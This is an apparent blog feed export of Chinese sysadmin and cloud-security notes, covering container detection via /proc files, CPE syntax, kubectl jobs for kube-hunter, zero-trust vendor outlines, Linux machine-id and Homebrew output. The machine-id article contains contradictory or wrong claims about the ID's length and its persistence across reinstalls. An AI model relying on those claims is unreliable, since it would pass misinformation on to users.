class="hljs-symbol">net_cls:</span>/<br><span class="hljs-number">4</span><span class="hljs-symbol">:hugetlb</span><span class="hljs-symbol">:/</span><br><span class="hljs-number">3</span><span class="hljs-symbol">:cpuset</span><span class="hljs-symbol">:/</span><br><span class="hljs-number">2</span><span class="hljs-symbol">:pids</span><span class="hljs-symbol">:/</span><br><span class="hljs-number">1</span><span class="hljs-symbol">:name=systemd</span><span class="hljs-symbol">:/</span><br></code></pre></td></tr></table></figure><p><strong>容器</strong></p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs elixir">[root<span class="hljs-variable">@4db3bdbde0f4</span> /]<span class="hljs-comment"># cat /proc/1/cgroup</span><br><span class="hljs-number">13</span><span class="hljs-symbol">:freezer</span><span class="hljs-symbol">:/docker/</span><span class="hljs-number">4</span>db3bdbde0f47c7ccc0a316a3e48ee28dcb2532cfdd1807edd669a156a6735fe<br><span class="hljs-number">12</span><span class="hljs-symbol">:perf_event</span><span class="hljs-symbol">:/docker/</span><span class="hljs-number">4</span>db3bdbde0f47c7ccc0a316a3e48ee28dcb2532cfdd1807edd669a156a6735fe<br><span class="hljs-number">11</span><span class="hljs-symbol">:memory</span><span class="hljs-symbol">:/docker/</span><span class="hljs-number">4</span>db3bdbde0f47c7ccc0a316a3e48ee28dcb2532cfdd1807edd669a156a6735fe<br><span class="hljs-number">10</span><span class="hljs-symbol">:blkio</span><span class="hljs-symbol">:/docker/</span><span class="hljs-number">4</span>db3bdbde0f47c7ccc0a316a3e48ee28dcb2532cfdd1807edd669a156a6735fe<br><span class="hljs-number">9</span><span class="hljs-symbol">:cpuset</span><span class="hljs-symbol">:/docker/</span><span class="hljs-number">4</span>db3bdbde0f47c7ccc0a316a3e48ee28dcb2532cfdd1807edd669a156a6735fe<br><span class="hljs-number">8</span><span class="hljs-symbol">:pids</span><span class="hljs-symbol">:/docker/</span><span class="hljs-number">4</span>db3bdbde0f47c7ccc0a316a3e48ee28dcb2532cfdd1807edd669a156a6735fe<br><span class="hljs-number">7</span><span class="hljs-symbol">:net_cls</span>,<span class="hljs-symbol">net_prio:</span>/docker/<span class="hljs-number">4</span>db3bdbde0f47c7ccc0a316a3e48ee28dcb2532cfdd1807edd669a156a6735fe<br><span class="hljs-number">6</span><span class="hljs-symbol">:misc</span><span class="hljs-symbol">:/</span><br><span class="hljs-number">5</span><span class="hljs-symbol">:devices</span><span class="hljs-symbol">:/docker/</span><span class="hljs-number">4</span>db3bdbde0f47c7ccc0a316a3e48ee28dcb2532cfdd1807edd669a156a6735fe<br><span class="hljs-number">4</span><span class="hljs-symbol">:rdma</span><span class="hljs-symbol">:/docker/</span><span class="hljs-number">4</span>db3bdbde0f47c7ccc0a316a3e48ee28dcb2532cfdd1807edd669a156a6735fe<br><span class="hljs-number">3</span><span class="hljs-symbol">:cpu</span>,<span class="hljs-symbol">cpuacct:</span>/docker/<span class="hljs-number">4</span>db3bdbde0f47c7ccc0a316a3e48ee28dcb2532cfdd1807edd669a156a6735fe<br><span class="hljs-number">2</span><span class="hljs-symbol">:hugetlb</span><span class="hljs-symbol">:/docker/</span><span class="hljs-number">4</span>db3bdbde0f47c7ccc0a316a3e48ee28dcb2532cfdd1807edd669a156a6735fe<br><span class="hljs-number">1</span><span class="hljs-symbol">:name=systemd</span><span class="hljs-symbol">:/docker/</span><span class="hljs-number">4</span>db3bdbde0f47c7ccc0a316a3e48ee28dcb2532cfdd1807edd669a156a6735fe<br></code></pre></td></tr></table></figure><h3 id="查看-proc-1-cmdline"><a href="#查看-proc-1-cmdline" class="headerlink" title="查看 &#x2F;proc&#x2F;1&#x2F;cmdline"></a>查看 &#x2F;proc&#x2F;1&#x2F;cmdline</h3><p><strong>物理机或虚拟机为 systemd 或者init程序</strong></p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs swift">[root<span class="hljs-meta">@iZbp1191gh7vw52537lyxrZ</span> <span class="hljs-operator">~</span>]# cat <span class="hljs-regexp">/proc/</span><span class="hljs-number">1</span><span class="hljs-operator">/</span>cmdline<br><span class="hljs-regexp">/usr/</span>lib<span class="hljs-regexp">/systemd/</span>systemd<span class="hljs-operator">--</span>system<span class="hljs-operator">--</span>deserialize25<br><br>[root<span class="hljs-meta">@localhost</span> <span class="hljs-regexp">/]# cat /</span>proc<span class="hljs-regexp">/1/</span>cmdline<br><span class="hljs-regexp">/usr/</span>lib<span class="hljs-regexp">/systemd/</span>systemd<span class="hljs-operator">--</span>switched<span class="hljs-operator">-</span>root<span class="hljs-operator">--</span>system<span class="hljs-operator">--</span>deserialize22<br></code></pre></td></tr></table></figure><p><strong>容器为应用程序</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@4db3bdbde0f4 /]# <span class="hljs-built_in">cat</span> /proc/1/cmdline<br>/bin/bash<br></code></pre></td></tr></table></figure><h1 id="参考资源"><a href="#参考资源" class="headerlink" title="参考资源"></a>参考资源</h1><p>【1】判断服务器是否为虚拟机的几种方法 <a href="https://www.jianshu.com/u/f109418ce585">baiyongjie</a> 2020.04.03 23:02:16</p><p><a href="https://www.jianshu.com/p/cc9033914819">https://www.jianshu.com/p/cc9033914819</a></p>]]></content>
    
    
    <categories>
      
      <category>security</category>
      
      <category>cloudsec</category>
      
    </categories>
    
    
    <tags>
      
      <tag>tips</tag>
      
      <tag>security</tag>
      
      <tag>cloudsec</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>cpe</title>
    <link href="/2024/12/16/yunwei/yunweibase/cpe/"/>
    <url>/2024/12/16/yunwei/yunweibase/cpe/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>Common Platform Enumeration 通用平台枚举</p><p>以标准化方式为软件应用程序、操作系统及硬件命令的方法</p><h2 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h2><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-symbol">cpe:</span>/&lt;part&gt;<span class="hljs-symbol">:&lt;vendor&gt;</span><span class="hljs-symbol">:&lt;product&gt;</span><span class="hljs-symbol">:&lt;version&gt;</span><span class="hljs-symbol">:&lt;update&gt;</span><span class="hljs-symbol">:&lt;edition&gt;</span><span class="hljs-symbol">:&lt;language&gt;</span><br></code></pre></td></tr></table></figure><h3 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h3><p>cpe:&#x2F;o:almalinux:almalinux:9::baseos</p><h3 id="参数解释"><a href="#参数解释" class="headerlink" title="参数解释"></a>参数解释</h3><h4 id="part-目标类型"><a href="#part-目标类型" class="headerlink" title="part 目标类型"></a>part 目标类型</h4><p>可选的值：<br>a 应用程序</p><p>h 硬件平台</p><p>o 操作系统</p><h4 id="vendor-厂商"><a href="#vendor-厂商" class="headerlink" title="vendor 厂商"></a>vendor 厂商</h4><h4 id="product-产品名称"><a href="#product-产品名称" class="headerlink" title="product 产品名称"></a>product 产品名称</h4><h4 id="version-厂商提供的产品版本号"><a href="#version-厂商提供的产品版本号" class="headerlink" title="version 厂商提供的产品版本号"></a>version 厂商提供的产品版本号</h4><h4 id="update-厂商提供的产品更新版本，细粒度更小"><a href="#update-厂商提供的产品更新版本，细粒度更小" class="headerlink" title="update 厂商提供的产品更新版本，细粒度更小"></a>update 厂商提供的产品更新版本，细粒度更小</h4><h4 id="edition-发行版本，属于被弃用的属性，一般是为了兼容更早-CPE-版本，默认值为-ANY"><a href="#edition-发行版本，属于被弃用的属性，一般是为了兼容更早-CPE-版本，默认值为-ANY" class="headerlink" title="edition 发行版本，属于被弃用的属性，一般是为了兼容更早 CPE 版本，默认值为 ANY"></a>edition 发行版本，属于被弃用的属性，一般是为了兼容更早 CPE 版本，默认值为 ANY</h4><h4 id="language-界面语言"><a href="#language-界面语言" class="headerlink" title="language  界面语言"></a>language  界面语言</h4><h4 id="se-edittion-表示产品是针对某些特定市场或类别的目标用户"><a href="#se-edittion-表示产品是针对某些特定市场或类别的目标用户" class="headerlink" title="se_edittion  表示产品是针对某些特定市场或类别的目标用户"></a>se_edittion  表示产品是针对某些特定市场或类别的目标用户</h4><h4 id="target-sw-产品运行需要的软件环境"><a href="#target-sw-产品运行需要的软件环境" class="headerlink" title="target_sw 产品运行需要的软件环境"></a>target_sw 产品运行需要的软件环境</h4><h4 id="target-hw-产品运行需要的硬件环境"><a href="#target-hw-产品运行需要的硬件环境" class="headerlink" title="target_hw  产品运行需要的硬件环境"></a>target_hw  产品运行需要的硬件环境</h4><h4 id="other-表示无法归类上上述其他属性的值"><a href="#other-表示无法归类上上述其他属性的值" class="headerlink" title="other 表示无法归类上上述其他属性的值"></a>other 表示无法归类上上述其他属性的值</h4><p>如果在 WFN 未使用某个属性，则称为未指明的属性，默认值未 ANY。<code>sw_edition</code> <code>target_sw</code> <code>target_hw</code> <code>other</code> 是新引入的属性，被称作扩展属性</p><p><img src="/2024/12/16/yunwei/yunweibase/cpe/image-20241217145011696.png" alt="image-20241217145011696"></p><h3 id="参考资源"><a href="#参考资源" class="headerlink" title="参考资源"></a>参考资源</h3><p>【1】网络安全知识图谱构建之CPE通用组件数据集 </p><p><a href="https://zhuanlan.zhihu.com/p/282898536">https://zhuanlan.zhihu.com/p/282898536</a></p>]]></content>
    
    
    <categories>
      
      <category>yunwei</category>
      
      <category>yunweibase</category>
      
    </categories>
    
    
    <tags>
      
      <tag>yunwei</tag>
      
      <tag>yunweibase</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>k8s_base</title>
    <link href="/2024/12/16/security/cloudsec/k8s/k8s_base/"/>
    <url>/2024/12/16/security/cloudsec/k8s/k8s_base/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><p>google开源</p><p>基础架构</p><p>master节点和node节点</p><p>master节点负责资源分配，应用调度，应用扩容等</p><p>node节点允许应用服务，node节点的kubelet负责进行master和node通信</p><p>k8s主要组件</p><p>kube-apiserver</p><h2 id="查看k8s版本"><a href="#查看k8s版本" class="headerlink" title="查看k8s版本"></a>查看k8s版本</h2><p>kubectl version</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">[root@node02 ~]# kubectl <span class="hljs-keyword">version</span><br><span class="hljs-built_in">WARNING</span>: This <span class="hljs-keyword">version</span> information <span class="hljs-keyword">is</span> deprecated <span class="hljs-keyword">and</span> will be replaced <span class="hljs-keyword">with</span> the output <span class="hljs-keyword">from</span> kubectl <span class="hljs-keyword">version</span> <span class="hljs-comment">--short.  Use --output=yaml|json to get the full version.</span><br>Client <span class="hljs-keyword">Version</span>: <span class="hljs-keyword">version</span>.<span class="hljs-keyword">Info</span>&#123;Major:&quot;1&quot;, Minor:&quot;26&quot;, GitVersion:&quot;v1.26.1&quot;, GitCommit:&quot;8f94681cd294aa8cfd3407b8191f6c70214973a4&quot;, GitTreeState:&quot;clean&quot;, BuildDate:&quot;2023-01-18T15:58:16Z&quot;, GoVersion:&quot;go1.19.5&quot;, Compiler:&quot;gc&quot;, Platform:&quot;linux/amd64&quot;&#125;<br>Kustomize <span class="hljs-keyword">Version</span>: v4<span class="hljs-number">.5</span><span class="hljs-number">.7</span><br><span class="hljs-keyword">Server</span> <span class="hljs-keyword">Version</span>: <span class="hljs-keyword">version</span>.<span class="hljs-keyword">Info</span>&#123;Major:&quot;1&quot;, Minor:&quot;24&quot;, GitVersion:&quot;v1.24.6&quot;, GitCommit:&quot;b39bf148cd654599a52e867485c02c4f9d28b312&quot;, GitTreeState:&quot;clean&quot;, BuildDate:&quot;2022-09-21T13:12:04Z&quot;, GoVersion:&quot;go1.18.6&quot;, Compiler:&quot;gc&quot;, Platform:&quot;linux/amd64&quot;&#125;<br><span class="hljs-built_in">WARNING</span>: <span class="hljs-keyword">version</span> difference <span class="hljs-keyword">between</span> client (<span class="hljs-number">1.26</span>) <span class="hljs-keyword">and</span> <span class="hljs-keyword">server</span> (<span class="hljs-number">1.24</span>) exceeds the supported minor <span class="hljs-keyword">version</span> skew <span class="hljs-keyword">of</span> +/<span class="hljs-number">-1</span><br></code></pre></td></tr></table></figure><h2 id="查看-job"><a href="#查看-job" class="headerlink" title="查看 job"></a>查看 job</h2><p>kubectl get job</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs autoit">[root<span class="hljs-symbol">@master01</span> kube-hunter]<span class="hljs-meta"># kubectl get job</span><br>NAME          COMPLETIONS   DURATION   AGE<br>kube-hunter   <span class="hljs-number">1</span>/<span class="hljs-number">1</span>           <span class="hljs-number">49</span>s        <span class="hljs-number">57</span>m<br></code></pre></td></tr></table></figure><h2 id="删除job"><a href="#删除job" class="headerlink" title="删除job"></a>删除job</h2><h3 id="按照job名删除"><a href="#按照job名删除" class="headerlink" title="按照job名删除"></a>按照job名删除</h3><p>kubectl delete job jobname</p><figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs coffeescript">[root@master01 kube-hunter]<span class="hljs-comment"># kubectl get job</span><br>NAME          COMPLETIONS   DURATION   AGE<br>kube-hunter   <span class="hljs-number">1</span>/<span class="hljs-number">1</span>           <span class="hljs-number">49</span>s        <span class="hljs-number">57</span>m<br>[root@master01 kube-hunter]<span class="hljs-comment"># </span><br>[root@master01 kube-hunter]<span class="hljs-comment"># </span><br>[root@master01 kube-hunter]<span class="hljs-comment"># kubectl delete job kube-hunter</span><br>job.batch <span class="hljs-string">&quot;kube-hunter&quot;</span> deleted<br>[root@master01 kube-hunter]<span class="hljs-comment"># kubectl get job</span><br>No resources found <span class="hljs-keyword">in</span> <span class="hljs-keyword">default</span> namespace.<br></code></pre></td></tr></table></figure><h2 id="创建job"><a href="#创建job" class="headerlink" title="创建job"></a>创建job</h2><p><strong>kubectl create -f jobfile</strong></p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs autoit">[root<span class="hljs-symbol">@master01</span> kube-hunter]<span class="hljs-meta"># kubectl create -f ./job.yaml</span><br><br>job.batch/kube-hunter created<br><br>[root<span class="hljs-symbol">@master01</span> kube-hunter]<span class="hljs-meta"># </span><br><br>[root<span class="hljs-symbol">@master01</span> kube-hunter]<span class="hljs-meta"># </span><br><br>[root<span class="hljs-symbol">@master01</span> kube-hunter]<span class="hljs-meta"># kubectl get jobs</span><br><br>NAME     COMPLETIONS  DURATION  AGE<br><br>kube-hunter  <span class="hljs-number">0</span>/<span class="hljs-number">1</span>      <span class="hljs-number">11</span>s    <span class="hljs-number">11</span>s<br></code></pre></td></tr></table></figure><h1 id="参考资源"><a href="#参考资源" class="headerlink" title="参考资源"></a>参考资源</h1>]]></content>
    
    
    <categories>
      
      <category>security</category>
      
      <category>cloudsec</category>
      
    </categories>
    
    
    <tags>
      
      <tag>security</tag>
      
      <tag>base</tag>
      
      <tag>cloudsec</tag>
      
      <tag>k8s</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>dc_attack</title>
    <link href="/2024/12/16/security/itsec/dc/dc_attack/"/>
    <url>/2024/12/16/security/itsec/dc/dc_attack/</url>
    
    <content type="html"><![CDATA[<span id="more"></span>]]></content>
    
    
    <categories>
      
      <category>security</category>
      
      <category>itsec</category>
      
    </categories>
    
    
    <tags>
      
      <tag>security</tag>
      
      <tag>itsec</tag>
      
      <tag>attack</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>零信任架构</title>
    <link href="/2024/12/16/security/itsec/%E9%9B%B6%E4%BF%A1%E4%BB%BB/%E9%9B%B6%E4%BF%A1%E4%BB%BB%E6%9E%B6%E6%9E%84/"/>
    <url>/2024/12/16/security/itsec/%E9%9B%B6%E4%BF%A1%E4%BB%BB/%E9%9B%B6%E4%BF%A1%E4%BB%BB%E6%9E%B6%E6%9E%84/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><h3 id="要解决的问题"><a href="#要解决的问题" class="headerlink" title="要解决的问题"></a>要解决的问题</h3><p>1、</p><p>2、</p><p>3、</p><h3 id="应对的方案"><a href="#应对的方案" class="headerlink" title="应对的方案"></a>应对的方案</h3><h4 id="持续验证"><a href="#持续验证" class="headerlink" title="持续验证"></a>持续验证</h4><h4 id="动态授权"><a href="#动态授权" class="headerlink" title="动态授权"></a>动态授权</h4><h4 id="全局防御"><a href="#全局防御" class="headerlink" title="全局防御"></a>全局防御</h4><h2 id="厂商方案"><a href="#厂商方案" class="headerlink" title="厂商方案"></a>厂商方案</h2><h3 id="百度7层零信任"><a href="#百度7层零信任" class="headerlink" title="百度7层零信任"></a>百度7层零信任</h3><p>问题</p><p>   （1）提供SaaS化的零信任网关服务</p><p>   （2）提供身份服务和账号风控能力</p><p>   （3）提供私有化部署完整解决方案(准入、零信任网关、桌管等能力)</p><p>安全能力</p><p>   （1）加密访问: 提供透明的加密访问能力</p><p>   （2）认证鉴权: 提供透明的SSO认证能力，以及域名级别访问控制能力</p><p>   （3）操作审计: 谁在什么时间点请求了哪个内网服务</p><p>   （4）安全防护: 提供WAF能力、用户异常访问动作序列等风控能力</p><p>   （5）数据防泄露: 检测响应里是否有敏感数据，对文件进行标记</p><p><a href="https://mp.weixin.qq.com/s/5utSjmXrh5enrAvJmJLFvQ">https://mp.weixin.qq.com/s/5utSjmXrh5enrAvJmJLFvQ</a></p><h3 id="腾讯零信任"><a href="#腾讯零信任" class="headerlink" title="腾讯零信任"></a>腾讯零信任</h3><p>腾讯ioa管理平台</p><p><img src="/%E8%85%BE%E8%AE%AFioa%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0.png" alt="腾讯ioa管理平台"></p><p>腾讯ioa架构</p><p><img src="/%E8%85%BE%E8%AE%AFioa%E6%9E%B6%E6%9E%84.jpg" alt="腾讯ioa架构"></p><h3 id="华为云零信任"><a href="#华为云零信任" class="headerlink" title="华为云零信任"></a>华为云零信任</h3>]]></content>
    
    
    <categories>
      
      <category>security</category>
      
      <category>itsec</category>
      
    </categories>
    
    
    <tags>
      
      <tag>security</tag>
      
      <tag>itsec</tag>
      
      <tag>零信任</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>machine_id</title>
    <link href="/2024/12/16/yunwei/yunweibase/Linuxbase/machine_id/"/>
    <url>/2024/12/16/yunwei/yunweibase/Linuxbase/machine_id/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>在 Linux 系统中，每台计算机都有一个唯一的标识符，称为机器 ID（Machine ID）。机器 ID 是一个由操作系统生成的字符串，用于标识特定的计算机。它在系统启动时自动生成，并且在系统的整个生命周期中保持不变。本文将详细介绍机器 ID 的作用、生成方式以及在 Linux 系统中的应用。</p><h2 id="机器-ID-的生成方式"><a href="#机器-ID-的生成方式" class="headerlink" title="机器 ID 的生成方式"></a>机器 ID 的生成方式</h2><p>Linux 系统中的机器 ID 是通过以下方式生成的：</p><h3 id="systemd"><a href="#systemd" class="headerlink" title="systemd"></a>systemd</h3><p>在现代的 Linux 发行版中，机器 ID 是由 systemd 生成和管理的。systemd 是一个系统和服务管理器，它负责启动、停止和管理系统上的各种进程和服务。当系统启动时，systemd 会生成一个机器 ID 并将其存储在 <code>/etc/machine-id</code> 文件中。这个文件是一个只包含机器 ID 的纯文本文件。</p><p>&#x2F;etc&#x2F;machine-id 文件默认权限</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs elixir">root<span class="hljs-variable">@iZbp1191gh7vw52537lyxrZ</span><span class="hljs-symbol">:/var/log</span><span class="hljs-comment"># ls -lat /etc/machine-id</span><br>-r--r--r-- <span class="hljs-number">1</span> root root <span class="hljs-number">33</span> <span class="hljs-title class_">Jun</span> <span class="hljs-number">13</span>  <span class="hljs-number">2023</span> /etc/machine-id<br></code></pre></td></tr></table></figure><h3 id="生成规则"><a href="#生成规则" class="headerlink" title="生成规则"></a>生成规则</h3><p>机器 ID 是一个 32 位的十六进制字符串，由 16 个字符组成。生成机器 ID 的规则如下：</p><ul><li>首先，系统会尝试读取 <code>/etc/machine-id</code> 文件。如果该文件存在且内容有效，则将其用作机器 ID。</li><li>如果 <code>/etc/machine-id</code> 文件不存在或内容无效，则系统会生成一个新的机器 ID，并将其写入 <code>/etc/machine-id</code> 文件中。</li></ul><h2 id="机器-ID-的作用"><a href="#机器-ID-的作用" class="headerlink" title="机器 ID 的作用"></a>机器 ID 的作用</h2><p>机器 ID 在 Linux 系统中具有以下作用：</p><h3 id="唯一标识符"><a href="#唯一标识符" class="headerlink" title="唯一标识符"></a>唯一标识符</h3><p>机器 ID 是用来唯一标识一台计算机的。通过机器 ID，系统可以识别不同的计算机，并进行一些特定的操作和配置。</p><h3 id="许可验证"><a href="#许可验证" class="headerlink" title="许可验证"></a>许可验证</h3><p>一些软件和服务提供商可能使用机器 ID 来验证许可证和授权。通过检查机器 ID，他们可以确定软件是否在授权范围内运行。</p><h3 id="安全性"><a href="#安全性" class="headerlink" title="安全性"></a>安全性</h3><p>机器 ID 在安全性方面也起到了一定的作用。它可以用于生成一些加密密钥或用于加密通信，以确保只有具有特定机器 ID 的计算机才能解密和访问数据。</p><h3 id="系统配置"><a href="#系统配置" class="headerlink" title="系统配置"></a>系统配置</h3><p>机器 ID 还可以用于系统配置和管理。一些配置文件和脚本可能会根据机器 ID 进行不同的操作或应用不同的设置。</p><h2 id="使用机器-ID"><a href="#使用机器-ID" class="headerlink" title="使用机器 ID"></a>使用机器 ID</h2><p>在 Linux 系统中，可以使用机器 ID 来进行一些操作和配置。</p><h3 id="查看机器-ID"><a href="#查看机器-ID" class="headerlink" title="查看机器 ID"></a>查看机器 ID</h3><p>要查看当前计算机的机器 ID，可以使用以下命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /etc/machine-id<br></code></pre></td></tr></table></figure><h3 id="使用机器-ID-进行其他操作"><a href="#使用机器-ID-进行其他操作" class="headerlink" title="使用机器 ID 进行其他操作"></a>使用机器 ID 进行其他操作</h3><p>除了查看机器 ID，还可以在以下情况下使用机器 ID 进行操作和配置：</p><ul><li>许可验证：某些软件和服务可能需要验证机器 ID 才能使用许可证进行授权。在这种情况下，你可以将机器 ID 提供给软件或服务提供商以进行许可证验证。</li><li>系统配置：一些配置文件或脚本可能会使用机器 ID 进行不同的操作或应用不同的设置。你可以根据机器 ID 编写脚本或配置文件，以根据不同的机器 ID 进行特定的配置。</li><li>安全性：机器 ID 可用于增加系统的安全性。例如，你可以使用机器 ID 生成一些加密密钥，以确保只有具有特定机器 ID 的计算机才能解密和访问数据。</li></ul><h2 id="机器-ID-的注意事项"><a href="#机器-ID-的注意事项" class="headerlink" title="机器 ID 的注意事项"></a>机器 ID 的注意事项</h2><p>在使用机器 ID 时，需要注意以下事项：</p><ul><li>唯一性：机器 ID 应该是唯一的，每台计算机都应该有不同的机器 ID。确保在克隆或复制系统时更新机器 ID。</li><li>保密性：机器 ID 是一个敏感信息，应该妥善保管。避免将机器 ID 泄露给不信任的人或系统。</li><li>持久性：机器 ID 在系统的整个生命周期中保持不变。在更换硬件或重新安装操作系统时，机器 ID 通常不会改变。</li></ul><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>机器 ID 是 Linux 系统中用于唯一标识计算机的标识符。它由 systemd 生成并存储在 <code>/etc/machine-id</code> 文件中。机器 ID 在许可验证、安全性和系统配置方面发挥着重要作用。通过机器 ID，系统可以识别不同的计算机并进行特定的操作和配置。在使用机器 ID 时，请确保唯一性、保密性和持久性，并根据需要使用相应的命令和配置文件来操作和配置系统。</p><h2 id="参考资源"><a href="#参考资源" class="headerlink" title="参考资源"></a>参考资源</h2><p>【1】开发者社区&#x2F;龙蜥操作系统&#x2F;文章&#x2F;什么是 Linux 中的机器 ID？</p><p><a href="https://developer.aliyun.com/article/1319056">https://developer.aliyun.com/article/1319056</a></p>]]></content>
    
    
    <categories>
      
      <category>yunwei</category>
      
      <category>yunweibase</category>
      
    </categories>
    
    
    <tags>
      
      <tag>yunwei</tag>
      
      <tag>yunweibase</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>brew_base</title>
    <link href="/2024/12/16/yunwei/applications/Macapplications/brew/brew_base/"/>
    <url>/2024/12/16/yunwei/applications/Macapplications/brew/brew_base/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h2 id="卸载"><a href="#卸载" class="headerlink" title="卸载"></a>卸载</h2><p>brew uninstall –ignore-dependencies <a href="mailto:&#112;&#x79;&#116;&#104;&#x6f;&#x6e;&#64;&#x33;&#x2e;&#49;&#x33;">&#112;&#x79;&#116;&#104;&#x6f;&#x6e;&#64;&#x33;&#x2e;&#49;&#x33;</a></p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs gradle">➜  brew uninstall --ignore-<span class="hljs-keyword">dependencies</span> python@<span class="hljs-number">3.13</span><br>Uninstalling <span class="hljs-regexp">/opt/</span>homebrew<span class="hljs-regexp">/Cellar/</span>python@<span class="hljs-number">3.13</span>/<span class="hljs-number">3.13</span>.<span class="hljs-number">0</span>_1... (<span class="hljs-number">3</span>,<span class="hljs-number">277</span> files, <span class="hljs-number">65.2</span>MB)<br>==&gt; Autoremoving <span class="hljs-number">10</span> unneeded formulae:<br>icu4c@<span class="hljs-number">75</span><br>jpeg<br>libffi<br>lua@<span class="hljs-number">5.3</span><br>pcre<br>protobuf<br>python-lxml<br>python-setuptools<br>pyyaml<br>six<br>Uninstalling <span class="hljs-regexp">/opt/</span>homebrew<span class="hljs-regexp">/Cellar/</span>python-setuptools/<span class="hljs-number">69.0</span>.<span class="hljs-number">3</span>... (<span class="hljs-number">262</span> files, <span class="hljs-number">2.9</span>MB)<br>Uninstalling <span class="hljs-regexp">/opt/</span>homebrew<span class="hljs-regexp">/Cellar/i</span>cu4c@<span class="hljs-number">75</span>/<span class="hljs-number">75.1</span>... (<span class="hljs-number">277</span> files, <span class="hljs-number">78.8</span>MB)<br>Uninstalling <span class="hljs-regexp">/opt/</span>homebrew<span class="hljs-regexp">/Cellar/</span>python-lxml/<span class="hljs-number">5.1</span>.<span class="hljs-number">0</span>... (<span class="hljs-number">204</span> files, <span class="hljs-number">9.8</span>MB)<br>Uninstalling <span class="hljs-regexp">/opt/</span>homebrew<span class="hljs-regexp">/Cellar/</span>pyyaml/<span class="hljs-number">6.0</span>.<span class="hljs-number">1</span>_1... (<span class="hljs-number">86</span> files, <span class="hljs-number">1.4</span>MB)<br>Uninstalling <span class="hljs-regexp">/opt/</span>homebrew<span class="hljs-regexp">/Cellar/</span>pcre/<span class="hljs-number">8.45</span>... (<span class="hljs-number">204</span> files, <span class="hljs-number">4.6</span>MB)<br>Uninstalling <span class="hljs-regexp">/opt/</span>homebrew<span class="hljs-regexp">/Cellar/</span>lua@<span class="hljs-number">5.3</span>/<span class="hljs-number">5.3</span>.<span class="hljs-number">6</span>... (<span class="hljs-number">28</span> files, <span class="hljs-number">407.3</span>KB)<br>Uninstalling <span class="hljs-regexp">/opt/</span>homebrew<span class="hljs-regexp">/Cellar/</span>six/<span class="hljs-number">1.16</span>.<span class="hljs-number">0</span>_4... (<span class="hljs-number">20</span> files, <span class="hljs-number">122.4</span>KB)<br>Uninstalling <span class="hljs-regexp">/opt/</span>homebrew<span class="hljs-regexp">/Cellar/</span>jpeg/<span class="hljs-number">9</span>e... (<span class="hljs-number">21</span> files, <span class="hljs-number">904.2</span>KB)<br>Uninstalling <span class="hljs-regexp">/opt/</span>homebrew<span class="hljs-regexp">/Cellar/</span>protobuf/<span class="hljs-number">21.12</span>... (<span class="hljs-number">288</span> files, 